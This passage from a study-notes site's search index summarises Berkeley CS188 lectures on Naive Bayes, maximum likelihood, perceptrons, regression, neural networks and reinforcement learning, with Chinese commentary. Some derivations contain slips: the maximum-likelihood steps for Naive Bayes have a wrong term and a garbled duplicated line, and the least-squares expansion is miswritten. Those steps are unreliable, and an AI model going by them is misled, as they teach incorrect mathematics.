\\[U^{\\boldsymbol{\\pi}}(s)=\\sum_{s^{\\prime}}T(s,\\boldsymbol{\\pi}(s),s^{\\prime})[R(s,\\boldsymbol{\\pi}(s),s^{\\prime})+\\boldsymbol{\\gamma}U^{\\boldsymbol{\\pi}}(s^{\\prime})]\\]","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#policy-improvement","title":"policy improvement","text":"<p>Once we\u2019ve evaluated the current policy, use policy improvement to generate a better policy.</p> <p>Define the policy at iteration i of policy iteration as \\(\\pi_{i}\\) , we have </p> \\[U_{k+1}^{{\\boldsymbol{\\pi}_{i}}}(s)\\leftarrow\\sum_{{s^{\\prime}}}T(s,\\boldsymbol{\\pi}_{i}(s),s^{\\prime})[R(s,\\boldsymbol{\\pi}_{i}(s),s^{\\prime})+\\boldsymbol{\\gamma}U_{k}^{{\\boldsymbol{\\pi}_{i}}}(s^{\\prime})]\\] <p>finally improve policy with:</p> \\[\\boldsymbol{\\pi}_{i+1}(s)=\\underset a{\\operatorname*{argmax}}\\sum_{s^{\\prime}}T(s,a,s^{\\prime})[R(s,a,s^{\\prime})+\\boldsymbol{\\gamma}U^{\\pi_i}(s^{\\prime})]\\]","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#summary","title":"summary","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/18-Iteration/#link","title":"link","text":"<ul> <li>cs188-sp24-note18</li> </ul> <ol> <li> <p>convergence means that \\(\\forall s \\in S, U_{k+1}(s) = U_{k}(s)\\).\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/","title":"19 Navie Bayes","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/#note","title":"note","text":"<p>Attention</p> <p>\u672c\u4eba\u6709\u4e9b\u8bb8\u673a\u5668\u5b66\u4e60\u57fa\u7840\uff0c\u6b64\u5904\u7b14\u8bb0\u5bf9\u4e8e\u4ece\u672a\u63a5\u89e6\u8fc7\u7684\u4eba\u6765\u8bf4\u53ef\u80fd\u4e9b\u8bb8\u7b80\u7565\uff0c\u5efa\u8bae\u67e5\u770b\u539f\u7b14\u8bb0\uff1b\u7c97\u7565\u4f46\u5b8c\u6574\u7684\u8bb2\u89e3\u63a8\u8350 Hung-yi Lee (\u674e\u5b8f\u6bc5) \u5728\u570b\u7acb\u81fa\u7063\u5927\u5b78\u5f00\u8bbe\u7684 Introduction to Generative AI 2024 Spring\u3002</p> <p>Until now, we\u2019ve assumed that the probabilistic models we\u2019ve worked with can be taken for granted, and the methods by which the underlying probability tables we worked with were generated have been abstracted away<sup>1</sup>. We\u2019ll begin to break down this abstraction barrier as we delve into our discussion of machine learning.</p> <p>Two primary subgroups of machine learning algorithms are supervised learning algorithms and unsupervised learning algorithms. We discuss the former now.</p> <p>Once you have a dataset that you\u2019re ready to learn with, the machine learning process usually involves splitting your dataset into three distinct subsets.  - The first, training data, is used to actually generate a model mapping inputs to outputs.  - Then, validation data (also known as hold-out or development data) is used to measure your model\u2019s performance by making predictions on inputs and generating an accuracy score,     - If your model doesn\u2019t perform as well as you\u2019d like it to, it\u2019s always okay to go back and train again, either by adjusting special model-specific values called hyperparameters or by using a different learning algorithm altogether until you\u2019re satisfied with your results.  - Finally, use your model to make predictions on the third and final subset of your data, the test set. The test set is the portion of your data that\u2019s never seen by your agent until the very end of development, and is the equivalent of a \"final exam\" to gauge performance on real-world data.</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/#naive-bayes-classification-problem","title":"Naive Bayes (classification problem)","text":"<p>Let\u2019s consider the common problem of building an email spam filter which sorts messages into spam (unwanted email) or ham (wanted email). Such a problem is called a classification problem</p> <p>To train a model to classify emails as spam or ham, we need some training data consisting of preclassified emails that we can learn from. However, emails are simply strings of text, and in order to learn anything useful, we need to extract certain attributes from each of them known as features. Features can be anything ranging from specific word counts to text patterns (e.g. whether words are in all caps or not) to pretty much any other attribute of the data that you can imagine. In this note, f(x) refers to a feature function applied to all inputs x before putting them in the model. </p> <p>Now let\u2019s say you have a dictionary of n words, and from each email you extract a feature vector \\(F\\in\\mathbb{R}^n\\) where the \\(i^{th}\\) entry in F is a random variable \\(F_i\\) which can take on a value of either a 0 or a 1 depending on whether the \\(i^{th}\\) word in your dictionary appears in the email under consideration. Then we just compute the probability:</p> \\[P(Y=spam|F_1=f_1,\\ldots,F_n=f_n) \\quad and\\quad P(Y=ham|F_1=f_1,\\ldots,F_n=f_n)\\] <p>\u5373\uff0c\u6211\u4eec\u7528\u5e03\u5c14\u5217\u8868\u4ee3\u8868\u67d0\u4e2a\u8bcd\u662f\u5426\u51fa\u73b0\u5728\u90ae\u4ef6\u4e2d\uff0c\u4ee5\u6b64\u4f5c\u4e3a\u7279\u5f81\u5411\u91cf\uff1b\u4f46\u662f\u8bb0\u4f4f\u8fd9\u4e00\u8ba1\u7b97\u662f \\(O(2^n)\\) \u7684\uff0c\u6211\u4eec\u4f7f\u7528 bayes' net \u6765\u8fdb\u884c\u7b80\u5316\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u964d\u4f4e\u81f3 \\(O(n)\\).</p> <p>This is solved by modeling the joint probability table with a Bayes\u2019 net, making the critical simplifying assumption that each feature Fi is independent of all other features given the class label. This is a very strong modeling assumption (and the reason that Naive Bayes is called naive), but it simplifies inference and usually works well in practice. Then we get:</p> \\[ \\begin{aligned}prediction(F) = prediction(f_1,\\cdots f_n)&amp;=\\underset{y}{\\operatorname*{argmax~}}P(Y=y|F_1=f_1,\\ldots F_N=f_n)\\\\&amp;=\\underset{y}{\\operatorname*{argmax~}}P(Y=y,F_1=f_1,\\ldots F_N=f_n)\\\\&amp;=\\underset{y}{\\operatorname*{argmax~}}P(Y=y)\\prod_{i=1}^{n}P(F_i=f_i|Y=y)\\end{aligned} \\]","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/#parameter-estimation","title":"Parameter Estimation","text":"<p>Assume you have a set of N sample points or observations, \\(x_1,\\dots, x_N\\), and you believe that this data was drawn from a distribution parametrized by an unknown value \u03b8.</p> <p>One answer to this question is to infer that \u03b8 is equal to the value that maximizes the probability of having selected your sample \\(x_1,\\dots, x_N\\) from your assumed probability distribution. A frequently used and fundamental method in machine learning known as maximum likelihood estimation (MLE) does exactly this.</p> <p>Maximum likelihood estimation typically makes the following simplifying assumptions:  - Each sample is drawn from the same distribution. In other words, each \\(x_i\\) is identically distributed. - Each sample \\(x_i\\) is conditionally independent of the others, given the parameters for our distribution. - All possible values of \u03b8 are equally likely before we\u2019ve seen any data (this is known as a uniform prior).</p> <p>The first two assumptions above are often referred to as independent, identically distributed (i.i.d.). The third assumption above makes the MLE method a special case of the maximum a priori (MAP) method, which allows for non-uniform priors</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/#maximum-likelihood-for-naive-bayes","title":"Maximum Likelihood for Naive Bayes","text":"<p>Considering \\(f_{i}^{(j)}\\) is a 1 if word i appeared in \\(j_th\\) email under consideration and 0 otherwise, we get:</p> \\[ \\mathscr{L}(\\boldsymbol{\\theta})=\\prod_{j=1}^{N_h}P(F_i=f_i^{(j)}|Y=ham)=\\prod_{j=1}^{N_h}\\theta^{f_i^{(j)}}(1-\\theta)^{1-f_i^{(j)}} \\] <p>To simplify the problem, we use monotonic transformation, that is, taking the logarithm of \\(\\mathscr{L}(\\theta)\\) :</p> \\[ \\begin{aligned}\\log\\mathscr{L}(\\theta)&amp;=\\quad\\log\\left(\\prod_{j=1}^{N_h}\\theta^{f_i^{(j)}}(1-\\boldsymbol{\\theta})^{1-f_i^{(j)}}\\right)\\\\&amp;=\\quad\\sum_{j=1}^{N_h}\\log\\left(\\theta^{f_i^{(j)}}(1-\\boldsymbol{\\theta})^{1-f_i^{(j)}}\\right)\\\\&amp;=\\quad\\sum_{j=1}^{N_h}\\log\\left(\\theta^{f_i^{(j)}}\\right)+\\sum_{j=1}^{N_h}\\log\\left((1-\\boldsymbol{\\theta})^{1-f_i^{(j)}})\\right)\\\\&amp;=\\quad\\log(\\theta)\\sum_{j=1}^{N_h}f_i^{(j)}+\\log(1-\\boldsymbol{\\theta})\\sum_{j=1}^{N_h}(1-f_i^{(j)})\\end{aligned} \\] <p>N - the number of observations (emails) you have for training. For our upcoming discussion, let\u2019s also define \\(N_h\\) as the number of training samples labeled as ham and \\(N_s\\) as the number of training samples labeled as spam. Note \\(N_h +N_s = N\\).</p> \\[ \\begin{aligned} \\frac\\partial{\\partial\\boldsymbol{\\theta}}\\left(\\log(\\boldsymbol{\\theta})\\sum_{j=1}^{N_h}f_i^{(j)}+\\log(1-\\boldsymbol{\\theta})\\sum_{j=1}^{N_h}(1-f_i^{(j)})\\right)&amp;=0\\\\ \\frac1\\theta\\sum_{j=1}^{N_h}f_i^{(j)}-\\frac1{(1-\\boldsymbol{\\theta})}\\sum_{j=1}^{N_h}f_i^{(j)}&amp;=0\\\\ \\frac1{\\theta}\\sum_{j=1}^{N_h}f_i^{(j)}&amp;=\\frac1{(1-\\boldsymbol{\\theta})}\\sum_{j=1}^{N_h}(1-f_i^{(j)})\\\\ (1-\\boldsymbol{\\theta}\\sum_{j=1}^{N_h}f_i^{(j)}&amp;=\\theta\\sum_{j=1}^{N_h}(1-f_i^{(j)})\\\\\\sum_{j=1}^{N_h}f_i^{(j)}-\\boldsymbol{\\theta}\\sum_{j=1}^{N_h}f_i^{(j)}&amp;=\\theta\\cdot N_h\\\\ \\theta&amp;=\\frac1{N_h}\\sum_{j=1}^{N_h}f_i^{(j)}=\\theta\\cdot N_h\\\\ \\theta&amp;=\\frac1{N_h}\\sum_{j=1}^{N_h}f_i^{(j)}\\end{aligned} \\] <p>We\u2019ve arrived at a remarkably simple final result!</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/#laplace-smoothing","title":"Laplace smoothing","text":"<p>Though maximum likelihood estimation is a very powerful method for parameter estimation, bad training data can often lead to unfortunate consequences. For example, if every time the word \"minute\" appears in an email in our training set, that email is classified as spam, our trained model will learn that \\(\\boldsymbol{P}(F_{minute}=1|Y=ham)=0\\); then every time \"minute\" appears, our model must consider it as spam. This is a classic example of overfitting, or building a model that doesn\u2019t generalize well to previously unseen data.</p> <p>Overfitting with Naive Bayes\u2019 classifiers can be mitigated by Laplace smoothing. Conceptually, Laplace smoothing with strength k assumes having seen k extra of each outcome.</p> <p>In N mails with |X| kinds of mails, \\(\\forall x \\in X\\), if using MLE, we get \\(P_{MLE}(x)=\\frac{count(x)}N\\). And then let's assume that there are k more of each of these messages in the sample. So we get:</p> <p>\\(\\(P_{LAP,k}(x)=\\frac{count(x)+k}{N+k|X|} \\implies P_{LAP,k}(x|y)=\\frac{count(x,y)+k}{count(y)+k|X|}\\)\\)  The specific value of k that\u2019s appropriate to use in our model is typically determined by trial-and-error. k is a hyperparameter in our model, which means that we can set it to whatever we want and see which value yields the best prediction accuracy/performance on our validation data.</p> <ul> <li>\\(P_{LAP,k}(x)=\\frac{count(x)+k}{N+k|X|}\\) </li> <li>\\(P_{LAP,0}(x)=\\frac{count(x)}{N} = P_{MEL}(x)\\) </li> <li>\\(P_{LAP,\\infty}(x)=\\frac{1}{|X|}\\) </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/19-Navie_Bayes/#link","title":"link","text":"<ul> <li>cs188-sp24-note19 </li> </ul> <ol> <li> <p>\u8fd9\u4e2a\u957f\u96be\u53e5\u4e5f\u662f\u96be\u7ef7\u7684\uff1b\u53c2\u8003\u7ffb\u8bd1\uff1a\u76f4\u5230\u73b0\u5728\uff0c\u6211\u4eec\u4e00\u76f4\u5047\u8bbe\u6211\u4eec\u6240\u4f7f\u7528\u7684\u6982\u7387\u6a21\u578b\u662f\u7406\u6240\u5f53\u7136\u7684\uff0c\u800c\u751f\u6210\u6211\u4eec\u6240\u7528\u7684\u6982\u7387\u8868\u7684\u90a3\u4e9b\u65b9\u6cd5\u4e5f\u5df2\u7ecf\u88ab\u62bd\u8c61\u6389\u4e86\u3002\u00a0\u21a9</p> </li> </ol>","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/","title":"20 Perceptron","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/#linear-classifiers","title":"Linear Classifiers","text":"<p>The basic idea of a linear classifier is to do classification using a linear combination of the features\u2013 a value which we call the activation. Concretely, the activation function takes in a data point, multiplies each feature of our data point, \\(f_i(x)\\), by a corresponding weight, wi , and outputs the sum of all the resulting values. In vector form, we can also write this as a dot product of our weights as a vector, w, and our featurized data point as a vector f(x):</p> \\[\\mathrm{activation}_{w}(\\mathbf{x})=h_{{\\mathbf{w}}}(\\mathbf{x})=\\sum_{i}w_{i}f_{i}(\\mathbf{x})=\\mathbf{w}^{T}\\mathbf{f}(\\mathbf{x})=\\mathbf{w}\\cdot\\mathbf{f}(\\mathbf{x})\\]","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/#binary-perceptron","title":"Binary Perceptron","text":"\\[ \\text{classify}(\\mathbf{x})=\\begin{cases}  +&amp;\\mathrm{if~}h_{\\mathbf{w}}(\\mathbf{x})&gt;0 \\iff \\cos{\\theta } &gt; 0 \\iff 0&lt;\\theta  &lt; \\frac{\\pi}{2} \\\\  -&amp;\\mathrm{if~}h_{\\mathbf{w}}(\\mathbf{x})&lt;0  \\iff \\cos{\\theta } &lt; 0 \\iff  \\frac{\\pi}{2} &lt; \\theta &lt; \\pi \\\\  \\end{cases} \\] <p>We call this blue line the decision boundary because it is the boundary that separates the region where we classify data points as positive from the region of negatives. In higher dimensions, a linear decision boundary is generically called a hyperplane.</p> <p></p> \\[ \\mathbf{h_{w+y^{*}f(x)}(x)= (w+y^{*}f(x))^T f(x)=h_{w}(x)+y^{*}f(x)^T f(x)} \\] <p>where \\(\\mathbf{f(x)^T f(x)}\\) is a positive number, so the \\(\\mathbf{h_{w}(x)}\\) changes in the direction of \\(y^*\\).</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/#bias","title":"Bias","text":"<p>Any decision boundary that you end up drawing will be crossing the origin. Basically, our perceptron can only produce a decision boundary that could be represented by the function \\(\\mathbf{w}^\\top\\mathbf{f}(\\mathbf{x})=0,\\mathbf{w},\\mathbf{f}(\\mathbf{x})\\in\\mathbb{R}^n\\). We will modify our feature and weights to add a bias term \\(\\mathbf{b}\\).</p> <p></p> <p>If \\(\\mathbf{w'=w+\\{1\\}, f'(x)=f(x)+\\{b\\}}\\), we also have: \\(\\mathbf{w'^T f'(x)=0}\\) .</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/#multiclass-perceptron","title":"Multiclass Perceptron","text":"<p>For the multi-class case, we will have one weight vector for each class. In order to classify a sample, we compute a score for each class by taking the dot product of the feature vector with each of the weight vectors. Whichever class yields the highest score is the one we choose as our prediction.</p> <p>Instead of doing as many dot products as there are classes, we can instead do a single matrix-vector multiplication. This tends to be much more efficient in practice (because matrix-vector multiplication usually has a highly optimized implementation).</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/20-Perceptron/#link","title":"link","text":"<ul> <li>cs188-sp24-note0 </li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/","title":"21 Regression","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#linear-regression","title":"Linear Regression","text":"<p>Regression problems are a form of machine learning problem in which the output is a continuous variable (denoted with y). The features can be either continuous or categorical. We will denote a set of features with \\(x \\in \\mathbb{R}^n\\) for n features, i.e. \\(\\mathbf{x} = (x_1 , \\dots, x_n)\\).</p> <p>The quantities y, X and w are defined as follows:</p> \\[ \\mathbf{y}=\\begin{bmatrix}y^1\\\\y^2\\\\\\vdots\\\\y^n\\end{bmatrix},\\:\\mathbf{X}=\\begin{bmatrix}1&amp;x_1^1&amp;\\cdots&amp;x_1^n\\\\1&amp;x_2^1&amp;\\cdots&amp;x_2^n\\\\\\vdots&amp;\\vdots&amp;\\cdots&amp;\\vdots\\\\1&amp;x_N^1&amp;\\cdots&amp;x_N^n\\end{bmatrix},\\:\\mathbf{w}=\\begin{bmatrix}w_0\\\\w_1\\\\\\vdots\\\\w_n\\end{bmatrix} \\leftrightarrow \\mathbf{\\hat{y}=Xw} \\] <p>If we use the L2 loss function which penalizes the difference of the predicted from the actual output using the L2 norm:</p> \\[ Loss(h_{\\mathbf{w}})=\\frac{1}{2}\\sum_{j=1}^{N}L2(y^{j},h_{\\mathbf{w}}(\\mathbf{x}^{j}))=\\frac{1}{2}\\sum_{j=1}^{N}(y^{j}-h_{\\mathbf{w}}(\\mathbf{x}^{j}))^{2}=\\frac{1}{2}\\left\\|\\mathbf{y}-\\mathbf{X}\\mathbf{w}\\right\\|_{2}^{2} \\] <p>More specifically, we will find the \\(\\mathbf{\\hat{w}}\\) that minimizes the loss function by differentiating the loss function and setting the derivative equal to zero:</p> \\[ \\begin{aligned}\\nabla_\\mathbf{w}\\frac12\\left\\|\\mathbf{y}-\\mathbf{X}\\mathbf{w}\\right\\|_2^2&amp;=\\nabla_\\mathbf{w}\\frac12\\left(\\mathbf{y}-\\mathbf{X}\\mathbf{w}\\right)^T\\left(\\mathbf{y}-\\mathbf{X}\\mathbf{w}\\right)=\\nabla_\\mathbf{w}\\frac12\\left(\\mathbf{y}^T\\mathbf{y}-\\mathbf{y}^T\\mathbf{X}^T\\mathbf{y}+\\mathbf{w}^T\\mathbf{X}\\mathbf{w}\\right)\\\\&amp;=\\nabla_\\mathbf{w}\\frac12\\left(\\mathbf{y}^T\\mathbf{y}-2\\mathbf{w}^T\\mathbf{X}^T\\mathbf{y}+\\mathbf{w}^T\\mathbf{X}\\mathbf{w}\\right)=-\\mathbf{X}^T\\mathbf{y}+\\mathbf{X}^T\\mathbf{X}\\mathbf{w}\\end{aligned} \\] <p>then:</p> \\[ \\nabla_\\mathbf{w}\\frac12\\left\\|\\mathbf{y}-\\mathbf{X}\\mathbf{\\hat{w}}\\right\\|_2^2 = 0  \\implies \\hat{\\mathbf{w}}=(\\mathbf{X}^T\\mathbf{X})^{-1}\\mathbf{X}^T\\mathbf{y} \\]","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#optimization","title":"Optimization","text":"<p>In complicated cases, we can use gradient-based methods to find the optimal weights, as shown below (\\(\\alpha\\) stands for learning rate).</p> <p></p> <p>If our dataset has a large number of n data points then computing the gradient as above in each iteration of the gradient descent algorithm might be too computationally intensive. As such, approaches like stochastic and batch gradient descent have been proposed.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#stochastic-gradient-descent","title":"stochastic gradient descent","text":"<p>In stochastic gradient descent at each iteration of the algorithm we use only one data point to compute the gradient. That one data point is each time randomly sampled form the dataset. Given that we only use one data point to estimate the gradient, stochastic gradient descent can lead to noisy gradients and thus make convergence a bit harder.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#mini-batch-gradient-descent","title":"Mini-batch gradient descent","text":"<p>Mini-batch gradient descent uses a batch of size m of data points each time to compute the gradients. The batch size m is a user specified parameter.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#logistic-regression","title":"Logistic Regression","text":"<p>Logistic regression allows us to turn a linear combination of our input features into a probability using the logistic function: \\(h_\\mathbf{w}(\\mathbf{x})=\\frac1{1+e^{-\\mathbf{w}^T\\mathbf{x}}}\\). It is important to note that though logistic regression is named as regression, this is a misnomer. Logistic regression is used to solve classification problems, not regression problems (for its function looks like:)</p> <p></p> \\[ \\begin{cases} P(y=+1|\\mathbf{f}(\\mathbf{x});\\mathbf{w})=\\frac1{1+e^{-\\mathbf{w}^T\\mathbf{f}(\\mathbf{x})}}\\quad \\\\ P(y=-1|\\mathbf{f}(\\mathbf{x});\\mathbf{w})=1-\\frac1{1+e^{-\\mathbf{w}^T\\mathbf{f}(\\mathbf{x})}} \\end{cases} \\]","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#multi-class-logistic-regression","title":"Multi-Class Logistic Regression","text":"<p>We use the softmax function in place of the logistic function </p> \\[ P(y=i|\\mathbf{f}(\\mathbf{x});\\mathbf{w})=\\frac{e^{\\mathbf{w}_i^T\\mathbf{f}(\\mathbf{x})}}{\\sum_{k=1}^Ke^{\\mathbf{w}_k^T\\mathbf{f}(\\mathbf{x})}} \\] <p>Hence, we can now express the likelihood as follows:</p> \\[ \\ell(\\mathbf{w}_1,\\ldots,\\mathbf{w}_K)=\\prod_{i=1}^n\\prod_{k=1}^K\\left(\\frac{e^{\\mathbf{w}_k^T\\mathbf{f}(\\mathbf{x}_i)}}{\\sum_{\\ell=1}^Ke^{\\mathbf{w}_\\ell^T\\mathbf{f}(\\mathbf{x}_i)}}\\right)^{t_{i,k}} \\implies \\log\\ell(\\mathbf{w}_1,\\ldots,\\mathbf{w}_K)=\\sum_{i=1}^n\\sum_{k=1}^Kt_{i,k}\\log\\left(\\frac{e^{\\mathbf{w}_k^T\\mathbf{f}(\\mathbf{x}_i)}}{\\sum_{\\ell=1}^Ke^{\\mathbf{w}_\\ell^T\\mathbf{f}(\\mathbf{x}_i)}}\\right) \\] <p>In the example of the multi-class logistic regression the gradient with respect to \\(w_j\\) is given by:</p> \\[ \\nabla_{\\mathbf{w}_j}\\log\\ell(\\mathbf{w})=\\sum_{i=1}^n\\nabla_{\\mathbf{w}_j}\\sum_{k=1}^Kt_{i,k}\\log\\left(\\frac{e^{\\mathbf{w}_k^T\\mathbf{f}(\\mathbf{x}_i)}}{\\sum_{\\ell=1}^Ke^{\\mathbf{w}_\\ell^T\\mathbf{f}(\\mathbf{x}_i)}}\\right)=\\sum_{i=1}^n\\left(t_{i,j}-\\frac{e^{\\mathbf{w}_j^T\\mathbf{f}(\\mathbf{x}_i)}}{\\sum_{\\ell=1}^Ke^{\\mathbf{w}_\\ell^T\\mathbf{f}(\\mathbf{x}_i)}}\\right)\\mathbf{f}(\\mathbf{x}_i) \\] <p>where we used the fact that \\(\\sum_{k}{t_{i,k}}=1\\).</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/21-Regression/#link","title":"link","text":"<ul> <li>cs188-sp24-note21</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/","title":"22 Neural Networks","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#note","title":"note","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#non-linear-separators","title":"Non-linear Separators","text":"<p>Consider the following set of data:</p> <p></p> <p>We would like to separate the two colors, and clearly there is no way this can be done in a single dimension (a single dimensional decision boundary would be a point, separating the axis into two regions). To fix this problem, we can add additional (potentially nonlinear) features to construct a decision boundary from. Consider the same dataset with the addition of \\(x^2\\) as a feature:</p> <p></p> <p>With this additional piece of information, we are now able to construct a linear separator in the two dimensional space containing the points. In this case, we were able to fix the problem by mapping our data to a higher dimensional space by manually adding useful features to data points. However, in many highdimensional problems, such as image classification, manually selecting features that are useful is a tedious problem. This requires domain-specific effort and expertise, and works against the goal of generalization across tasks. A natural desire is to learn these featurization or transformation functions as well, perhaps using a nonlinear function class that is capable of representing a wider variety of functions.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#multi-layer-perceptron","title":"Multi-layer Perceptron","text":"<p>Consider the following setup, a two-layer perceptron, which is a perceptron that takes as input the outputs of another perceptron.</p> <p></p> <p>In fact, we can generalize this to an N-layer perceptron.</p> <p>Universal Function Approximators</p> <p>A two-layer neural network with a sufficient number of neurons can approximate any continuous function to any desired accuracy.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#measuring-accuracy","title":"Measuring Accuracy","text":"<p>The accuracy of the binary perceptron after making n predictions can be expressed as:</p> \\[ l^{acc}(w)=\\frac1n\\sum_{i=1}^n(sgn(w\\cdot\\mathbf{f}(\\mathbf{x}_i))==y_i)\\quad where\\quad  sgn(x)= \\begin{cases} +1, &amp; x &gt; 0 \\\\ 0, &amp; x = 0 \\\\ -1, &amp; x &lt; 0 \\end{cases} \\]","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#multi-layer-feedforward-neural-networks","title":"Multi-layer Feedforward Neural Networks","text":"<p>Multi-layer NN is much like the multi-layer perceptron, however, we choose a different non-linearity to apply after the individual perceptron nodes. Non-linearities makes the network as a whole non-linear and more expressive.</p> <ul> <li>\\(\\text{Sigmoid: }\\sigma(x)=\\frac1{1+e^{-x}}\\)</li> <li>\\(ReLU{:~}f(x)=max(0, x)=\\begin{cases}0&amp;\\mathrm{if~}x&lt;0\\\\x&amp;\\mathrm{if~}x\\geq0&amp;\\end{cases}\\)</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#backpropagation","title":"Backpropagation","text":"<p>To efficiently calculate the gradients for each parameter in a neural network, we will use an algorithm known as backpropagation. Backpropagation represents the neural network as a dependency graph of operators and operands, called a computational graph, such as the one shown below for computing \\((2+3)*4\\) (\\(g=(x+y) \\land f = g*z\\)):</p> <p></p> <p>Recall the chain rule in calculus (for \\(f(x_{1}, x_{2}, \\dots x_{n})\\) where \\(x_{k}(t_{1}, t_{2}, \\dots , t_{m})\\)):</p> \\[ \\frac{\\partial f}{\\partial t_{i}}=\\frac{\\partial f}{\\partial x_{1}}\\cdot\\frac{\\partial x_{1}}{\\partial t_{i}}+\\frac{\\partial f}{\\partial x_{2}}\\cdot\\frac{\\partial x_{2}}{\\partial t_{i}}+\\ldots+\\frac{\\partial f}{\\partial x_{n}}\\cdot\\frac{\\partial x_{n}}{\\partial t_{i}}. \\] <p>Values in green are the outputs of each node, which we compute in the forward pass, where we apply each node\u2019s operation to its input values coming from its parent nodes.</p> <p>Values in red after each node give gradients of the function computed by the graph, which are computed in the backward pass: the red <code>1</code> after \\(f\\) stands for \\(\\frac{\\partial f}{\\partial f}\\); red <code>4</code> after \\(g / z\\) stands for \\(\\frac{\\partial f}{\\partial g} / \\frac{\\partial f}{\\partial z}\\). Then gets \\(\\frac{\\partial f}{\\partial x} / \\frac{\\partial f}{\\partial y}\\) .</p> <p>Computation graphs are a great way to visualize repeated application of the chain rule from calculus, as this process is required for backpropagation in neural networks.</p>","tags":["notes","cs188"]},{"location":"note/cs188/note/22-Neural_Networks/#link","title":"link","text":"<ul> <li>cs188-sp24-note22</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/note/24-Reinforcement_Learnin/","title":"24 Reinforcement Learnin","text":"","tags":["notes","cs188"]},{"location":"note/cs188/note/24-Reinforcement_Learnin/#note","title":"note","text":"<p>In the previous note, solving Markov decision processes is an example of offline planning, where agents have full knowledge of both the transition function and the reward function, all the information they need to precompute optimal actions in the world encoded by the MDP without ever actually taking any actions. In this note, we\u2019ll discuss online planning, during which an agent has no prior knowledge of rewards or transitions in the world (still represented as a MDP).</p> <p>In online planning, an agent must try exploration, during which it performs actions and receives feedback in the form of the successor states it arrives in and the corresponding rewards it reaps. The agent uses this feedback to estimate an optimal policy through a process known as reinforcement learning before using this estimated policy for exploitation or reward maximization.</p> <p>There are two types of reinforcement learning, model-based learning and model-free learning.  - Modelbased learning attempts to estimate the transition and reward functions with the samples attained during exploration before using these estimates to solve the MDP normally with value or policy iteration.  - Modelfree learning, on the other hand, attempts to estimate the values or Q-values of states directly, without ever using any memory to construct a model of the rewards and transitions in the MDP.</p> <p>\u5185\u5bb9\u5f88\u7d27\uff0c\u539f note \u6ca1\u6709\u5565\u53ef\u4ee5\u7701\u7565\u7684\uff0c\u5efa\u8bae\u76f4\u63a5\u770b\u539f\u6587\uff0c\u4e0b\u9762\u662f\u5f88\u597d\u7684\u603b\u7ed3\uff1a</p> <p></p>","tags":["notes","cs188"]},{"location":"note/cs188/note/24-Reinforcement_Learnin/#link","title":"link","text":"<ul> <li>cs188-sp24-note24</li> <li>cs188-sp24-note25</li> </ul>","tags":["notes","cs188"]},{"location":"note/cs188/project/","title":"The Pac-Man Projects","text":"<p>\u8fd9\u91cc\u662fCS188 sp24 \u7684 project The Pac-Man Projects \u7684\u89e3\u7b54\u3002</p> <p>\u9879\u76ee\u5b9e\u73b0\u6548\u679c\u5927\u81f4\u5982\uff1apacman_game\u3002</p> <p>Attention</p> <p>\u4ee5\u4e0b\u6240\u6709\u8bb2\u89e3\u9ed8\u8ba4\u8bfb\u8005\u9605\u8bfb\u6216\u8005\u7406\u89e3\u4e86\u5bf9\u5e94 <code>[!PREREQUISITE]</code> \u90e8\u5206\u7684\u6240\u6709\u5185\u5bb9\uff0c\u4e14\u770b\u61c2 python \u8bed\u6cd5\u6ca1\u6709\u95ee\u9898\u3002</p> <ul> <li>project-0</li> <li>project-1</li> <li>project-2</li> <li>project-3</li> <li>project-4</li> </ul> <p>project5/6 \u8bb2\u89e3\u8d77\u6765\u5341\u5206\u590d\u6742\uff0c\u53ef\u80fd\u76f4\u63a5\u770b\u4ee3\u7801\u4f1a\u6709\u66f4\u6df1\u7684\u611f\u53d7\uff0c\u5e76\u6ca1\u6709\u5b9e\u73b0\u76f8\u5173\u8bb2\u89e3\uff1bproject6 \u7684 Q7 \u4ee3\u7801\u5df2\u7ecf\u5b8c\u6210\uff0c\u4f46\u662f\u8bad\u7ec3\u4e0b\u6765\u6548\u679c\u4e0d\u4f73\uff0c\u95ee\u9898\u4e0d\u77e5\u4f55\u5904\u5bfb\uff0c\u9042\u653e\u5f03\u3002</p> \u672c\u4eba project \u73af\u5883 <ul> <li>project 0-3<ul> 